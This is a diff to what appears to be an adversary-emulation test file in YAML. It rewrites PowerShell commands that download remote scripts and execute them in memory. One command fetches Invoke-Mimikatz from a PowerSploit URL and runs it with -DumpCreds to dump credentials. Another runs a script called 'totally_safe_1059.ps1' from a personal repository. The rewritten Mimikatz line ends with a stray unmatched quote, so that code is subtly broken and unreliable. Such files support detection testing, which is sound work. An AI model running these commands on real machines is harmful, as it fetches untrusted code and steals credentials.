@@ -14,7 +14,8 @@ atomic_tests:
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     command: |
-      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+       $wc = New-Object Net.WebClient; $wc.UseDefaultCredentials = $true; 
+       iex $wc.DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     name: command_prompt
     elevation_required: false
 - name: Run BloodHound from local disk
@@ -491,7 +492,9 @@ atomic_tests:
       default: https://raw.githubusercontent.com/Moerov/FireSOC/refs/heads/main/utils/totally_safe_1059.ps1
       description: Powershell script url
   executor:
-    command: IEX (New-Object Net.WebClient).DownloadString('#{pwshurl}')
+    command: | 
+            $wc = New-Object Net.WebClient; $wc.UseDefaultCredentials = $true; 
+            iex $wc.DownloadString('#{pwshurl}')
     name: powershell
     elevation_required: false
 - name: 'Custom: Retrieve and Execute Base64 PowerShell Payload via DNS TXT Record'
